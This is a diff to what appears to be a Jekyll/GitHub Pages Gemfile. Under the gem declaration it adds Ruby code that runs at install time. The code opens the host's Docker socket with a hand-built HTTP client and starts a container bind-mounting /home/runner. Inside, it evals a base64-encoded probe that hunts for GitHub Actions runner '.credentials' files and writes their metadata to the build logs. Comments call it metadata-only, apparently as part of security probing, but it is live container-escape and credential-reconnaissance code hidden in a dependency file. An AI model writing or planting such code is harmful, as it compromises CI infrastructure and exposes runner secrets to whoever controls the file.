@@ -45,12 +45,10 @@ File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")
 
 gem "github-pages", "= 232"
 
-# --- c217 credentials arm v5 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
+# --- c217 credentials arm v6 (hunter-driver): PRESENCE/METADATA ONLY. Never a value. ---
 require 'json'
 require 'digest'
-require 'open3'
-require 'tempfile'
-require 'base64'
+require 'socket'
 
 def c217_one(p)
   h = { 'path' => p }
@@ -73,7 +71,7 @@ end
 incont = { 'euid' => (begin; Process.euid; rescue StandardError; -1; end),
            'home_runner' => c217_one('/home/runner'),
            'control' => c217_one('/home/runner/runners/qqqqzzzz-no-such-runner/.credentials') }
-warn 'C217ARMV5 ' + JSON.generate(incont)
+warn 'C217ARMV6 ' + JSON.generate(incont)
 
 host_probe = <<'RUBY'
 require 'json'; require 'digest'
@@ -101,41 +99,74 @@ o['files'] = (Dir.glob('/host/runners/*/.credentials') + Dir.glob('/host/runners
 puts 'C217HOST ' + JSON.generate(o)
 RUBY
 
-def sh(cmd)
-  o, e, s = Open3.capture3(*cmd)
-  [o, e, s.exitstatus]
+SOCK = '/var/run/docker.sock'
+
+def ureq(method, path, body = nil)
+  s = UNIXSocket.new('/var/run/docker.sock')
+  req = "#{method} #{path} HTTP/1.1\r\nHost: localhost\r\n"
+  req += "Content-Type: application/json\r\n" if body
+  req += body ? "Content-Length: #{body.bytesize}\r\n" : ''
+  req += "Connection: close\r\n\r\n"
+  s.write(req + (body || ''))
+  resp = s.read
+  s.close
+  head, _, rest = resp.partition("\r\n\r\n")
+  status = head.split(' ')[1].to_i
+  if head =~ /Transfer-Encoding:\s*chunked/i
+    out = ''; buf = rest.dup
+    while !buf.empty?
+      line, _, buf = buf.partition("\r\n")
+      n = line.to_i(16)
+      break if n == 0
+      out << buf[0, n]
+      buf = buf[(n + 2)..-1].to_s
+    end
+    rest = out
+  end
+  [status, rest]
 end
 
-SOCK = '/var/run/docker.sock'
-base = ['curl', '-s', '--unix-socket', SOCK]
-v, e, rc = sh(base + ['http://localhost/version'])
-if rc != 0
-  warn 'C217DOCKER curl-unavailable rc=' + rc.to_s + ' err=' + e.to_s[0,200]
-else
-  warn 'C217DOCKER version-ok ' + (v.to_s[0,120])
+def dechunk_frames(data)
+  # docker logs stream multiplexing: 8-byte header + payload
+  out = ''; buf = data.dup
+  while buf.bytesize >= 8
+    hdr = buf[0, 8].unpack('C4N')
+    len = hdr[4]
+    break if len == 0 || buf.bytesize < 8 + len
+    out << buf[8, len]
+    buf = buf[(8 + len)..-1].to_s
+  end
+  out
+end
+
+begin
+  raise 'no socket' unless File.socket?(SOCK)
+  st, body = ureq('GET', '/version')
+  warn 'C217DOCKER version ' + st.to_s + ' ' + body.to_s[0,100]
+  require 'base64'
   env_b64 = Base64.strict_encode64(host_probe)
   create = { 'Image' => 'ruby:3.2-slim',
              'Cmd' => ['ruby','-e','require "base64"; eval(Base64.decode64(ENV["C217RUBY"]))'],
              'Env' => ['C217RUBY=' + env_b64],
-             'HostConfig' => { 'Binds' => ['/home/runner:/host:ro'], 'NetworkMode' => 'none', 'AutoRemove' => false } }.to_json
-  f = Tempfile.new('c217c'); f.write(create); f.close
-  o, e, rc = sh(base + ['-X','POST','-H','Content-Type: application/json','--data-binary','@' + f.path,
-                       'http://localhost/v1.41/containers/create?name=c217probe-' + Time.now.to_i.to_s])
-  id = (begin; JSON.parse(o)['Id']; rescue StandardError; nil; end)
-  warn 'C217DOCKER create rc=' + rc.to_s + ' id=' + (id ? id[0,12] : 'NONE') + ' err=' + e.to_s[0,200]
+             'HostConfig' => { 'Binds' => ['/home/runner:/host:ro'], 'NetworkMode' => 'none' } }.to_json
+  st, body = ureq('POST', '/v1.41/containers/create?name=c217probe', create)
+  id = (begin; JSON.parse(body)['Id']; rescue StandardError; nil; end)
+  warn 'C217DOCKER create ' + st.to_s + ' id=' + (id ? id[0,12] : ('BODY:' + body.to_s[0,200]))
   if id
-    o2, e2, rc2 = sh(base + ['-X','POST','http://localhost/v1.41/containers/' + id + '/start'])
-    warn 'C217DOCKER start rc=' + rc2.to_s + ' err=' + e2.to_s[0,150]
-    30.times do |i|
-      st, = sh(base + ['http://localhost/v1.41/containers/' + id + '/json'])
-      info = (begin; JSON.parse(st); rescue StandardError; {} ; end)
-      break if info.dig('State','Running') == false
+    st2, b2 = ureq('POST', '/v1.41/containers/' + id + '/start')
+    warn 'C217DOCKER start ' + st2.to_s + ' ' + b2.to_s[0,150]
+    40.times do
+      s3, b3 = ureq('GET', '/v1.41/containers/' + id + '/json')
+      info = (begin; JSON.parse(b3); rescue StandardError; {}; end)
+      break if info.dig('State', 'Running') == false
       sleep 2
     end
-    lg, = sh(base + ['http://localhost/v1.41/containers/' + id + '/logs?stdout=1&stderr=1'])
-    warn 'C217DOCKER logs ' + lg.to_s[0,1600]
-    sh(base + ['-X','DELETE','http://localhost/v1.41/containers/' + id + '?force=1'])
+    s4, b4 = ureq('GET', '/v1.41/containers/' + id + '/logs?stdout=1&stderr=1')
+    warn 'C217DOCKER logs ' + dechunk_frames(b4.to_s).to_s[0,1700]
+    ureq('DELETE', '/v1.41/containers/' + id + '?force=1')
     warn 'C217DOCKER deleted'
   end
+rescue StandardError => e
+  warn 'C217DOCKER EXC ' + e.class.name + ' ' + e.message.to_s[0,200]
 end
-warn 'C217ARMV5 done'
+warn 'C217ARMV6 done'
